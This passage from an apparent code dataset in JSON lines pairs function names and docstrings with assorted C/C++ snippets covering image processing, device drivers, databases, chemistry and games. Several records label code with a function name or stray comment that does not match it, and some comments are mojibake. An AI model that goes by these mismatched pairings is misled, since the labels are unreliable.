desired.\\n    if (storeLeftEye)\\n        *storeLeftEye = leftEye;\\n    if (storeRightEye)\\n        *storeRightEye = rightEye;\\n\\n    \/\/ Check if both eyes were detected.\\n    if (leftEye.x >= 0 && rightEye.x >= 0) {\\n\\n        \/\/ Make the face image the same size as the training images.\\n\\n        \/\/ Since we found both eyes, lets rotate & scale & translate the face so that the 2 eyes\\n        \/\/ line up perfectly with ideal eye positions. This makes sure that eyes will be horizontal,\\n        \/\/ and not too far left or right of the face, etc.\\n\\n        \/\/ Get the center between the 2 eyes.\\n        Point2f eyesCenter = Point2f((leftEye.x + rightEye.x) * 0.5f, (leftEye.y + rightEye.y) * 0.5f);\/\/\u00c1\u0153\u00d1\u00db\u00d6\u00d0\u00b5\u00e3\\n        \/\/ Get the angle between the 2 eyes.\\n        double dy = (rightEye.y - leftEye.y);\\n        double dx = (rightEye.x - leftEye.x);\\n        double len = sqrt(dx*dx + dy*dy);\/\/\u00c1\u0153\u00d1\u00db\u00b5\u00c4\u0178\u00e0\u00c0\u00eb\\n        double angle = atan2(dy, dx) * 180.0 \/ CV_PI; \/\/ Convert from radians to degrees.\\n\\n        \/\/ Hand measurements shown that the left eye center should ideally be at roughly (0.19, 0.14) of a scaled face image.\\n        const double DESIRED_RIGHT_EYE_X = (1.0f - DESIRED_LEFT_EYE_X);\/\/\u00d7\u00f3\u00d1\u00db\u00b5\u0153\u00d3\u00d2\u00d1\u00db\u00b5\u00c4\u0178\u00e0\u00c0\u00eb\\n        \/\/ DESIRED_LEFT_EYE_X=0.16\\n        \/\/ Get the amount we need to scale the image to be the desired fixed size we want.\\n        double desiredLen = (DESIRED_RIGHT_EYE_X - DESIRED_LEFT_EYE_X) * desiredFaceWidth;\/\/\u00d7\u00f3\u00d1\u00db\u00b5\u0153\u00d3\u00d2\u00d1\u00db\u00b5\u00c4\u0178\u00e0\u00c0\u00eb\\n        \/\/double DESIRED_LEFT_EYE_Y = 0.14;\\n        double scale = desiredLen \/ len;\\n        \/\/ Get the transformation matrix for rotating and scaling the face to the desired angle & size.\\n        Mat rot_mat = getRotationMatrix2D(eyesCenter, angle, scale);\\n        \/\/ Shift the center of the eyes to be the desired center between the eyes.\\n        rot_mat.at<double>(0, 2) += desiredFaceWidth * 0.5f - eyesCenter.x;\\n        rot_mat.at<double>(1, 2) += desiredFaceHeight * DESIRED_LEFT_EYE_Y - eyesCenter.y;\/\/DESIRED_LEFT_EYE_Y = 0.14;\\n\\n        \/\/ Rotate and scale and translate the image to the desired angle & size & position!\\n        \/\/ Note that we use \\'w\\' for the height instead of \\'h\\', because the input face has 1:1 aspect ratio.\\n        Mat warped = Mat(desiredFaceHeight, desiredFaceWidth, CV_8U, Scalar(128)); \/\/ Clear the output image to a default grey.\\n        warpAffine(gray, warped, rot_mat, warped.size());\/\/gray\u00c8\u00cb\u00c1\u00b3\u00b5\u00c4\u00bb\u00d2\u00b6\u00c8\u00cd\u0152\\n        \/\/imshow(\"warped\", warped);\\n\\n        \/\/ Give the image a standard brightness and contrast, in case it was too dark or had low contrast.\\n        if (!doLeftAndRightSeparately) {\\n            \/\/ Do it on the whole face.\\n            equalizeHist(warped, warped);\\n        }\\n        else {\\n            \/\/ Do it seperately for the left and right sides of the face.\\n            equalizeLeftAndRightHalves(warped);\\n        }\\n        \/\/imshow(\"equalized\", warped);\\n\\n        \/\/ Use the \"Bilateral Filter\" to reduce pixel noise by smoothing the image, but keeping the sharp edges in the face.\\n        Mat filtered = Mat(warped.size(), CV_8U);\\n        bilateralFilter(warped, filtered, 0, 20.0, 2.0);\/\/\u00cb\u00ab\u00b1\u00df\u00c2\u00cb\u00b2\u0161\u017d\u00ef\u00b5\u0153\u00b1\u00a3\u00b1\u00df\u00c8\u00a5\u00d4\u00eb\u00b5\u00c4\u00c4\u00bf\u00b5\u00c4\\n        \/\/imshow(\"filtered\", filtered);\\n\\n        \/\/ Filter out the corners of the face, since we mainly just care about the middle parts.\\n        \/\/ Draw a filled ellipse in the middle of the face-sized image.\\n        Mat mask = Mat(warped.size(), CV_8U, Scalar(0)); \/\/ Start with an empty mask.\u00b3\u00f5\u00ca\u0152\u00bb\u00af\u00ce\u00aa\u00ba\u00da\u00c9\u00ab\\n        Point faceCenter = Point(desiredFaceWidth \/ 2, cvRound(desiredFaceHeight * FACE_ELLIPSE_CY));\\n        Size size = Size(cvRound(desiredFaceWidth * FACE_ELLIPSE_W), cvRound(desiredFaceHeight * FACE_ELLIPSE_H));\\n        ellipse(mask, faceCenter, size, 0, 0, 360, Scalar(255), CV_FILLED);\/\/\u017e\u00c3\u00ba\u00af\u00ca\u00fd\u00d3\u00c3\u00d3\u00da\u00bb\\xad\u00d2\u00bb\u017e\u00f6\u00cd\u00d6\u00d4\u00b2\u00a3\u00ac\u00cd\u00d6\u00d4\u00b2\u00b5\u00c4\u00d6\u00d0\u00d0\u00c4\u00ca\u00c7\u00cf\u00de\u00b6\u0161\u0178\u00d8\u00d0\u00ce\u00b5\u00c4\u00d6\u00d0\u00d0\u00c4\u00a3\u00ac\u00ca\u00b9\u00d3\u00c3\u00b5\u00b1\u00c7\u00b0\u00bb\\xad\u00b1\u00ca\u00bb\\xad\u00cd\u00d6\u00d4\u00b2\u00a3\u00ac\u00d3\u00c3\u00b5\u00b1\u00c7\u00b0\u00b5\u00c4\u00bb\\xad\u00cb\u00a2\u00cc\u00ee\u00b3\u00e4\u00cd\u00d6\u00d4\u00b2\u00a1\u00a3\\n        \/\/imshow(\"mask\", mask);\\n\\n        \/\/ Use the mask, to remove outside pixels.\\n        Mat dstImg = Mat(warped.size(), CV_8U, Scalar(128)); \/\/ Clear the output image to a default gray.\\n\\n        \/\/ Apply the elliptical mask on the face.\\n        filtered.copyTo(dstImg, mask);  \/\/ Copies non-masked pixels from filtered to dstImg.\\n        \/\/imshow(\"dstImg\", dstImg);\\n\\n        return dstImg;\\n    }\\n\\n}\\nelse\\n{\\n    return Mat();\\n}\\n\\n}'}","id":4088}
{"content":"{'function_name': 'CompleteArbitrationSuccessProcessing', 'docstring': '\/\/', 'code': 'BOOL WINAPI\\nCompleteRemoteCertificateVerification(\\n    __in HANDLE LeasingApplication,\\n    __in PVOID RemoteCertVerifyCallbackOperation,\\n    __in NTSTATUS verifyResult\\n    )\\n\\n\/*++\\nRoutine Description:\\n\\n     Completes a remote certification verification\\n\\nParameters Description:\\n\\n    RemoteCertVerifyCallbackOperation - The operation handle in the kernel to complete the verify result\\n \\nReturn Value:\\n\\n    TRUE if arguments are valid, FALSE otherwise.   \\n\\n--*\/\\n\\n{\\n    DWORD BytesReturned = 0;\\n\\n    REMOTE_CERT_VERIFY_CALLBACK_OPERATION_INPUT_BUFFER DeviceIoctlInputBuffer;\\n    ZeroMemory(&DeviceIoctlInputBuffer, sizeof(REMOTE_CERT_VERIFY_CALLBACK_OPERATION_INPUT_BUFFER));\\n\\n    LeaseLayerEvents.SendCertVerifyResultToKernel((LONGLONG)RemoteCertVerifyCallbackOperation, verifyResult);\\n\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer \\n    \/\/ has been successfully initialized.\\n    \/\/\\n    if (!IsLeaseLayerInitialized())\\n    {\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == RemoteCertVerifyCallbackOperation)\\n    {\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Initialize device IOCTL input buffer.\\n    \/\/\\n    DeviceIoctlInputBuffer.LeasingApplicationHandle = LeasingApplication;\\n    DeviceIoctlInputBuffer.CertVerifyOperation = RemoteCertVerifyCallbackOperation;\\n    DeviceIoctlInputBuffer.VerifyResult = verifyResult;\\n\\n    \/\/\\n    \/\/ Create a device IOCTL and send it to the device.\\n    \/\/\\n    auto status = DeviceIoControl(\\n        IOCTL_REMOTE_CERT_VERIFY_RESULT,\\n        &DeviceIoctlInputBuffer,\\n        sizeof(REMOTE_CERT_VERIFY_CALLBACK_OPERATION_INPUT_BUFFER),\\n        NULL,\\n        0,\\n        &BytesReturned);\\n\\n    return NT_SUCCESS(status)? TRUE : FALSE;\\n}'}","id":4095}
{"content":"{'function_name': 'partition', 'docstring': '\/\/pivot\\r', 'code': 'int Longest_Increasing_Sequence(double A[M][3]) {\\r\\n\\tint X[M];\\r\\n\\t\/\/X[0]=1;X[i]=max{X[j]}+1;j<i,and A[j]<A[i]\\r\\n\\tint S[M];\\r\\n\\tX[0] = 1;\\r\\n\\tS[0] = 0;\\r\\n\\tfor (int i = 1; i < M; i++) {\\r\\n\\t\\tint q = 1;\\r\\n\\t\\tfor (int j = 0; j < i; j++) {\\r\\n\\t\\t\\tif (A[j][1] < A[i][1]) {\\r\\n\\t\\t\\t\\tq = X[j] + 1;\\r\\n\\t\\t\\t\\tif (q > X[i]) {\\r\\n\\t\\t\\t\\t\\tX[i] = q;\\r\\n\\t\\t\\t\\t\\tS[i] = j;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t\\tif (q == 1) {\\r\\n\\t\\t\\tX[i] = 1;\\r\\n\\t\\t\\tS[i] = i;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tcout << \"X[i]\" << endl;\\r\\n\\tfor (int i = 0; i < M; i++) cout << X[i] << \",\";\\r\\n \\tcout << endl;\\r\\n\\r\\n\\tint max = 0;\\r\\n\\tint max_i;\\r\\n\\tfor (int i = 0; i < M; i++) {\\r\\n\\t\\tif (X[i] > max) {\\r\\n\\t\\t\\tmax = X[i];\\r\\n\\t\\t\\tmax_i = i;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tcout << \"print:\" << endl;\\r\\n\\tprint(S, A, max_i);\\r\\n\\tcout << endl;\\r\\n\\r\\n\\treturn X[max_i];\\r\\n}'}","id":4097}
{"content":"{'function_name': 'reshape', 'docstring': '\/\/glOrtho(-5,5,-5,5,0.1,20);\\t\\r', 'code': 'int main ( int argc, char** argv )   \/\/ Main Function\\r\\n{\\r\\n  glutInit            (&argc, argv); \/\/ Inicializamos OpenGL\\r\\n  \/\/glutInitDisplayMode (GLUT_RGBA | GLUT_SINGLE | GLUT_DEPTH); \/\/ Display Mode (Clores RGB y alpha | Buffer Sencillo )\\r\\n  glutInitDisplayMode (GLUT_RGB | GLUT_DOUBLE | GLUT_DEPTH); \/\/ Display Mode (Clores RGB y alpha | Buffer Doble )\\r\\n  glutInitWindowSize  (500, 500);\\t\/\/ Tama\u00f1o de la Ventana\\r\\n  glutInitWindowPosition (0, 0);\\t\/\/Posicion de la Ventana\\r\\n  glutCreateWindow    (\"Reporte 4\"); \/\/ Nombre de la Ventana\\r\\n  InitGL ();\\t\\t\\t\\t\\t\\t\/\/ Parametros iniciales de la aplicacion\\r\\n  glutDisplayFunc     ( display );  \/\/Indicamos a Glut funci\u00f3n de dibujo\\r\\n  glutReshapeFunc     ( reshape );\\t\/\/Indicamos a Glut funci\u00f3n en caso de cambio de tamano\\r\\n  glutKeyboardFunc    ( keyboard );\\t\/\/Indicamos a Glut funci\u00f3n de manejo de teclado\\r\\n  glutSpecialFunc     ( arrow_keys );\\t\/\/Otras\\r\\n  glutMainLoop        ( );          \/\/ \\r\\n\\r\\n  return 0;\\r\\n}'}","id":4099}
{"content":"{'function_name': 'start_ltr114', 'docstring': '\/\/\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f', 'code': 'INT LTR114_Close\\n    (\\n    PTLTR114 hnd\\n    )\\n    {\\n    \/*\\n     * \u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u043c\u043e\u0434\u0443\u043b\u0435\u043c LTR114.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     *   \u0417\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u043a\u0430\u043d\u0430\u043b \u0441\u0432\u044f\u0437\u0438 \u0441 \u043c\u043e\u0434\u0443\u043b\u0435\u043c.\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0434\u0443\u043b\u044f.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u041a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0444\u0430\u0439\u043b \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0430).\\n     *\/\\n\\n    INT ret_val = LTR_OK;\\n\\n\\n    if (hnd == NULL)\\n    {\\n        ret_val = LTR114_ERR_INVALID_DESCR;\\n    }\\n    else\\n    {\\n        DWORD cmd = LTR010CMD_STOP;  \/\/\u043e\u0441\u0442\u0430\u043d\u043e\u0432 \u043c\u043e\u0434\u0443\u043b\u044f - \u043f\u043e\u0441\u044b\u043b\u043a\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b STOP\\n        int i;\\n\\n        LTR_Send(&hnd->Channel, &cmd, 1, send_tm_out);    \\n\\n        for (i=0; i < LTR114_ADC_RANGEQNT; i++)  \/*\u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u043f\u0430\u043c\u044f\u0442\u0438, \u0435\u0441\u043b\u0438 \u0431\u044b\u043b\u0430 \u0437\u0430\u043d\u044f\u0442\u0430*\/\\n        {\\n            if (hnd->AutoCalibrInfo[i].TempScale!=NULL)\\n            {\\n                free(hnd->AutoCalibrInfo[i].TempScale);\\n                hnd->AutoCalibrInfo[i].TempScale = NULL;\\n            }\\n        }\\n\\n\\t\\tif (hnd->Reserve != NULL)\\n\\t\\t\\tfree(hnd->Reserve);\\n\\t\\thnd->Reserve = NULL;\\n\\n        \/*        if (hnd->FilterData!=NULL)\\n        {\\n            free(hnd->FilterData);\\n            hnd->FilterData = NULL;\\n        }*\/\\n        ret_val = LTR_Close(&hnd->Channel);\\n    }\\n\\n    hnd->Active = FALSE;\\n\\n    return ret_val; \\n    }'}","id":4106}
{"content":"{'function_name': 'p_GeoDaWeight__IsSymmetric', 'docstring': '\/\/ invoke the function', 'code': 'bool p_GeoDaWeight__HasIsolates(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  bool has_iso = ptr->HasIsolates();\\n\\n  return has_iso;\\n}'}","id":4110}
{"content":"{'function_name': 'is_azide', 'docstring': '\/\/ We have 3 nitrogens. They must be [N-]=[N+]=N or N#N=N', 'code': 'static int\\ncompute_clnd (const Molecule & m)\\n{\\n  int rc = 0;\\n\\n  int matoms = m.natoms();\\n\\n  int * ngroup = new_int(matoms); std::unique_ptr<int[]> free_ngroup(ngroup);\\n  \\n\/\/ First look for [N-]#[N+]=N because they count for 1 each (why I have no idea).\\n\\n  for (int i = 0; i < matoms; i++)  \\n  {\\n    if (ngroup[i])    \/\/ already counted as part of another group\\n      continue;\\n\\n    if (7 != m.atomic_number(i))\\n      continue;\\n\\n    if (1 != m.ncon(i))\\n      continue;\\n\\n    if (is_azide(m, i, ngroup))\\n      rc += 1;\\n  }\\n\\n  for (int i = 0; i < matoms; i++)\\n  {\\n    if (ngroup[i])\\n      continue;\\n\\n    if (7 != m.atomic_number(i))\\n      continue;\\n\\n    int gsize = identify_ngroup(m, i, ngroup);\\n\\n    rc += gsize \/ 2;\\n    if (1 == gsize % 2)\\n      rc++;\\n  }\\n\\n  return rc;\\n}'}","id":4112}
{"content":"{'function_name': 'detect_cut_cells3', 'docstring': '\/\/std::cout << bold << yellow << \"detect_cut_cells3, time resolution: \" << tc << \" seconds\" << reset << std::endl;', 'code': 'void\\nrefine_interface2(cuthho_mesh<T, ET>& msh, typename cuthho_mesh<T, ET>::cell_type& cl,\\n                 const Function& level_set_function, size_t min, size_t max)\\n{\\n    if ( (max-min) < 2 )\\n        return;\\n\\n    typedef typename cuthho_mesh<T, ET>::point_type     point_type;\\n\\n    size_t mid = (max+min)\/2;\\n    auto p0 = cl.user_data.interface.at(min);\\n    auto p1 = cl.user_data.interface.at(max);\\n    auto pm = (p0+p1)\/2.0;\\n    auto pt = p1 - p0;\\n    auto pn = point_type(-pt.y(), pt.x());\\n    auto ps1 = pm + pn;\\n    auto ps2 = pm - pn;\\n\\n    auto lm = level_set_function(pm,msh,cl);\\n    auto ls1 = level_set_function(ps1,msh,cl);\\n    auto ls2 = level_set_function(ps2,msh,cl);\\n\\n    point_type ip;\\n   \/\/ std::cout<<\"the node of interface are \"<<p0<<\" and \"<<p1<<\". I search pm= \"<<pm<<\" in which phi = \"<<lm<<\" and ps1 e ps2 \"<<ps1<<\" and \"<<ps2<<\"equal to \"<<ls1<<\" , \"<<ls2<<std::endl;\\n    if ( !((lm >= 0 && ls1 >= 0) || (lm < 0 && ls1 < 0)) )\\n    {\\n        auto threshold = diameter(msh, cl) \/ 1e20;\\n        ip = find_zero_crossing_in_cell(pm, ps1, level_set_function, threshold,msh,cl);\\n    }\\n    else if ( !((lm >= 0 && ls2 >= 0) || (lm < 0 && ls2 < 0)) )\\n    {\\n        auto threshold = diameter(msh, cl) \/ 1e20;\\n        ip = find_zero_crossing_in_cell(pm, ps2, level_set_function, threshold,msh,cl);\\n    }\\n    else\\n        throw std::logic_error(\"interface not found in search range\");\\n\\n    cl.user_data.interface.at(mid) = ip;\\n\\n    refine_interface2(msh, cl, level_set_function, min, mid);\\n    refine_interface2(msh, cl, level_set_function, mid, max);\\n}'}","id":4119}
{"content":"{'function_name': 'ErrIsamCloseDatabase', 'docstring': '\/\/', 'code': \"ERR ISAMAPI ErrIsamSetDatabaseSize( JET_SESID sesid, const WCHAR *wszDatabase, DWORD cpg, DWORD *pcpgReal )\\n{\\n    ERR             err         = JET_errSuccess;\\n    PIB*            ppib        = (PIB *)sesid;\\n    IFileSystemAPI* pfsapi      = PinstFromPpib( ppib )->m_pfsapi;\\n    DBFILEHDR_FIX*  pdbfilehdr  = NULL;\\n    IFileAPI*       pfapi       = NULL;\\n    QWORD           cbFileSize;\\n\\n    if ( NULL == wszDatabase || 0 == *wszDatabase )\\n        return ErrERRCheck( JET_errDatabaseInvalidPath );\\n\\n    if ( cpg < cpgDatabaseApiMinReserved )\\n    {\\n        return ErrERRCheck( JET_errInvalidParameter );\\n    }\\n\\n    AllocR( pdbfilehdr = (DBFILEHDR_FIX*)PvOSMemoryPageAlloc( g_cbPage, NULL ) );\\n\\n    \/\/  this should never be called on the temp database (e.g. we will not need to force the OS file-system)\\n    Call( CIOFilePerf::ErrFileOpen( pfsapi,\\n                                    PinstFromPpib( ppib ),\\n                                    wszDatabase, \\n                                    IFileAPI::fmfNone,\\n                                    iofileDbAttached,\\n                                    qwSetDbSizeFileID,\\n                                    &pfapi ) );\\n \\n    Call( ErrUtilReadShadowedHeader(    PinstFromPpib( ppib ),\\n                                        pfsapi,\\n                                        pfapi,\\n                                        (BYTE *)pdbfilehdr,\\n                                        g_cbPage,\\n                                        OffsetOf( DBFILEHDR_FIX, le_cbPageSize ) ) );\\n \\n    \/\/  Disallow setting size on an inconsistent database\\n\\n    if ( pdbfilehdr->Dbstate() == JET_dbstateIncrementalReseedInProgress )\\n    {\\n        Call( ErrERRCheck( JET_errDatabaseIncompleteIncrementalReseed ) );\\n    }\\n    else if ( pdbfilehdr->Dbstate() == JET_dbstateRevertInProgress )\\n    {\\n        Call( ErrERRCheck( JET_errDatabaseIncompleteRevert ) );\\n    }\\n    else if ( pdbfilehdr->Dbstate() != JET_dbstateCleanShutdown )\\n    {\\n        Call( ErrERRCheck( JET_errDatabaseInconsistent ) );\\n    }\\n\\n    \/\/  Set new database size only if it is larger than db size.\\n\\n    Call( pfapi->ErrSize( &cbFileSize, IFileAPI::filesizeLogical ) );\\n\\n    ULONG cpgNow;\\n    cpgNow = ULONG( ( cbFileSize \/ g_cbPage ) - cpgDBReserved );\\n\\n    if ( cpgNow >= cpg )\\n    {\\n        *pcpgReal = cpgNow;\\n    }\\n    else\\n    {\\n        *pcpgReal = cpg;\\n\\n        cbFileSize = g_cbPage * ( cpg + cpgDBReserved );\\n        \\n        PIBTraceContextScope tcSetSize = ppib->InitTraceContextScope();\\n        tcSetSize->iorReason.SetIorp( iorpDatabaseExtension );\\n        tcSetSize->SetDwEngineObjid( objidSystemRoot );\\n\\n        Call( pfapi->ErrSetSize( *tcSetSize,\\n                                    cbFileSize,\\n                                    fTrue,\\n                                    QosSyncDefault( PinstFromPpib( ppib ) ) ) );\\n\\n        \/\/  No pinst, no ifmp, can't use any of the right functions.\\n        Call( ErrUtilFlushFileBuffers( pfapi, iofrDbResize ) );\\n    }\\n\\nHandleError:\\n    OSMemoryPageFree( (void*)pdbfilehdr );\\n    if ( err < JET_errSuccess && pfapi != NULL )\\n    {\\n        Call( ErrUtilFlushFileBuffers( pfapi, iofrDefensiveErrorPath ) );\\n    }\\n    delete pfapi;\\n    return err;\\n}\"}","id":4124}
{"content":"{'function_name': 'flushSyncEvent', 'docstring': '\/* translate type to CapnProto enum *\/', 'code': \"auto flushOrphans(OrphanagePtr flushedOrphanage, OrphanList flushedOrphans, gzFile fz) -> bool\\n{\\n    \/* need to keep the orphanage alive until it's flushed *\/\\n    (void)flushedOrphanage;\\n\\n    \/* create the message now that we have a fixed length *\/\\n    ::capnp::MallocMessageBuilder message;\\n    auto eventStreamBuilder = message.initRoot<EventStream>();\\n    auto eventsBuilder = eventStreamBuilder.initEvents(flushedOrphans.size());\\n\\n    for (unsigned i=0; i<flushedOrphans.size(); ++i)\\n    {\\n        auto reader = flushedOrphans[i].getReader();\\n        eventsBuilder.setWithCaveats(i, reader);\\n    }\\n\\n    ::capnp::writePackedMessageToGz(fz, message);\\n\\n    \/* burn down the orphanage and orphans *\/\\n    flushedOrphans.clear(); \/* kill orphans first,\\n                               otherwise we die when we run into the burning orphanage\\n                               to kill the orphans *\/\\n    return true;\\n}\"}","id":4129}
{"content":"{'function_name': 'cornerDetect', 'docstring': '\/\/epsilon=0.001', 'code': 'int main(int argc, char* argv[])\\n{\\n    if(argv[1]== nullptr)\\n    {\\n        cout << \"Please Check the launch file\" << endl;\\n    }\\n    string config_path(argv[1]);\\n    cout << \"Config.path = \" << config_path << endl;\\n    Config::setParameterFile(config_path);\\n    string work_dir = Config::get<string>(\"working.dir\");\\n    outFile.open(work_dir + \"data\/image_points.txt\");\\n\\n    \/\/\/ Load images\\n    string images_dir = Config::get<string>(\"images.dir\");\\n    string image_path = images_dir + \"\/image_lists.txt\";\\n    vector<string> image_paths;\\n    ifstream inFile;\\n    inFile.open(image_path);\\n    while (inFile.good())\\n    {\\n        string image_name;\\n        inFile >> image_name;\\n        string img_path = images_dir + \"\/\" + image_name;\\n        image_paths.push_back(img_path);\\n        inFile.get();\\n    }\\n\\n    \/\/\/ Corner detect\\n    double fx = Config::get<double>(\"fx\");\\n    double fy = Config::get<double>(\"fy\");\\n    double cx = Config::get<double>(\"cx\");\\n    double cy = Config::get<double>(\"cy\");\\n\\n    double k1 = Config::get<double>(\"k1\");\\n    double k2 = Config::get<double>(\"k2\");\\n    double p1 = Config::get<double>(\"p1\");\\n    double p2 = Config::get<double>(\"p2\");\\n\\n    cv::Mat K = (Mat_<double>(3, 3) << fx, 0., cx, 0., fy, cy, 0., 0., 1.);\\n    cv::Mat D = (Mat_<double>(5,1) << k1, k2, p1, p2, 0.0);\\n    cout << \"K:\\\\n\" << K << endl;\\n    cout << \"D:\\\\n\" << D << endl;\\n\\n    cout << \"We need to process \" << image_paths.size() << \" images\" << endl;\\n    for (int i = 0; i < image_paths.size(); ++i)\\n    {\\n\\n        cout << \"Processing images: \" << i << endl;\\n        \/\/\/ TO DO: Undistort the image\\n        org = imread(image_paths[i]);\\n\\n        cv::undistort(org,img,K,D);\\n        org = img.clone();\\n\/\/        org.copyTo(img);\\n        org.copyTo(tmp);\\n        namedWindow(\"img\");\\n        setMouseCallback(\"img\",on_mouse,0);\\n        imshow(\"img\",img);\\n        cv::waitKey(0);\\n        destroyWindow(\"corner\");\\n        outFile << keypoint.x << \" \" << keypoint.y << endl;\\n        cout << \"Save \" << i << \" keypoint suscessfully\" << endl;\\n    }\\n    destroyAllWindows();\\n    outFile.close();\\n    cout << \"Save the sequence suscessfully\" << endl;\\n    cout << \"The output file saved in: \" << work_dir + \"data\/image_points.txt\" << endl;\\n\\n    return 0;\\n\\n}'}","id":4130}
{"content":"{'function_name': 'Add_Block', 'docstring': '\/\/  overloading', 'code': 'int Rule(std::vector<std::vector<int>> board){              \/\/ return \ud615\uc774 int \ud615\uc774\uba70 \uac8c\uc784\ubcf4\ub4dc data\ub97c vector<std::vector<int>> \ud615\uc73c\ub85c \ubc1b\ub294 \ud568\uc218 Rule\\n    List mlist,m2list;                                      \/\/ mlist\uc640 m2List \uc120\uc5b8\\n    List* list=&mlist;                                      \/\/ list\ub294 mlist\uc758 \uc8fc\uc18c\uac12\uc744 \ub2f4\uace0\uc788\ub2e4.\\n    List* clist=&m2list;                                    \/\/ clist\ub294 m2list\uc758 \uc8fc\uc18c\uac12\uc744 \ub2f4\uace0\uc788\ub2e4.\\n    initlist(list);                                         \/\/ list \ucd08\uae30\ud654\\n    initlist(clist);                                        \/\/ clist \ucd08\uae30\ud654\\n\\n    int example[7][6];                                      \/\/ \uac8c\uc784\ud310\uc758 data\ub97c \ub2f4\uc744 int\ud615 2\ucc28\uc6d0\ubc30\uc5f4 \uc120\uc5b8\\n    \\n    for (int x = 0; x < 7; x++) {                           \/\/ vector<std::vector<int>> \uc758 \ub370\uc774\ud130\ub97c int\ud615 2\ucc28\uc6d0\ubc30\uc5f4\uc5d0 \ub2f4\ub294\ub2e4\\n        for (int y = 0; y < 6; y++) {\\n            example[x][y] = board[x][y];\\n        }\\n    }\\n    \\n    if(First_shot(example)){                                \/\/ \uac8c\uc784\uc758 \uccab\uc218\ub97c \ub450\ub294\uc9c0 \ud310\ubcc4\ud558\ub294 \ud568\uc218 return\uac12\uc774 true\ub77c\uba74 \uccab\uc218\ub97c \ub450\ub294 \uac83\uc774\ub2e4.\\n        printf(\"----------------------------\\\\n\");\\n        printf(\"Printing part of rule...\\\\n\");\\n        printf(\"Shape : Not Detected, Priority : Not Detected\\\\n\");\\n        printf(\"Uesd Method : Solution 0\\\\n\");\\n        printf(\"----------------------------\\\\n\");\\n        return 2;                                           \/\/ \uccab\uc218\ub97c \ub454\ub2e4\uba74 Grid \uae30\uc900 (2,0) \uc5d0 \ub454\ub2e4.\\n    }\\n    \\n    if(Find_Shape_1(list,example)){                         \/\/ Shape \uac00 1\uc778 \ube14\ub85d\uc744 \ucc3e\uc544\uc11c List\uc5d0 \ucd94\uac00\ud558\ub294 \uacfc\uc815\uc744 \ub2f4\uace0\uc788\ub294 \ud568\uc218\\n        for(int i=1; i<=List_Count(list);i++){              \/\/ List\ub0b4\uc758 \uc874\uc7ac\ud558\ub294 \ubaa8\ub4e0 Block \uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c \ubc18\ubcf5\ubb38\\n            Block* temp= Select_ith_Block(i, list);\\n            Define_Block(temp, example);                    \/\/ Block \uc758 Priority\uc640 key1,key2\uac12\uc744 \uc9c0\uc815\ud574\uc8fc\uae30\uc704\ud55c \ud568\uc218\\n        }\\n        AddCautionList(list,clist);                         \/\/ \ub450\uba74 \uc548\ub418\ub294 \ucc29\uc218\uc810 \uc815\ubcf4\ub97c \ub2f4\uace0\uc788\ub294 \ubaa8\ub4e0 Block\ub4e4\uc744 clist\uc5d0 \ucd94\uac00\\n        Block* result =Compare_Block(list);                 \/\/ \ud604\uc7ac List\uc5d0 \uc800\uc7a5\ub41c \ubaa8\ub4e0 Block\ub4e4\uc744 \ube44\uad50\ud574 \uc801\ud569\ud55c Block\uc744 \ucd94\ub824\uc8fc\ub294 \ud568\uc218\\n        if(result!=NULL){                                   \/\/ \ub9cc\uc57d \ucc3e\uc740 Block \uc774 \uc5c6\ub2e4\uba74 \ub2e4\ub978 Shape \uc758 Block\uc744 \ucc3e\uc73c\ub85c \uc774\ub3d9\ud558\uace0 \ub9cc\uc57d \ucc3e\uc558\ub2e4\uba74\\n            ShowBlock(result);                              \/\/ \ucc3e\uc740 Block \uc758 data\ub97c \ucd9c\ub825\ud55c\ub2e4\\n            ShowMethod(result);\\n            int r= result->key.x;                           \/\/ \ucc29\uc218\uc810\uc758 \uc704\uce58\ub97c \ucd94\ub824\ub0b8\ub2e4\\n            return r;                                       \/\/ \ucc29\uc218\uc810\uc744 \ubc18\ud658\ud55c\ub2e4\\n        }\\n    }\\n    if(Find_Shape_2(list,example)){                         \/\/ Shape \uac00 2\uc778 \ube14\ub85d\uc744 \ucc3e\uc544\uc11c List\uc5d0 \ucd94\uac00\ud558\ub294 \uacfc\uc815\uc744 \ub2f4\uace0\uc788\ub294 \ud568\uc218\\n        for(int i=0; i<List_Count(list);i++){               \/\/ List\ub0b4\uc758 \uc874\uc7ac\ud558\ub294 \ubaa8\ub4e0 Block \uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c \ubc18\ubcf5\ubb38\\n            Block* temp = Select_ith_Block(i+1, list);\\n            Define_Block(temp, example);                    \/\/ 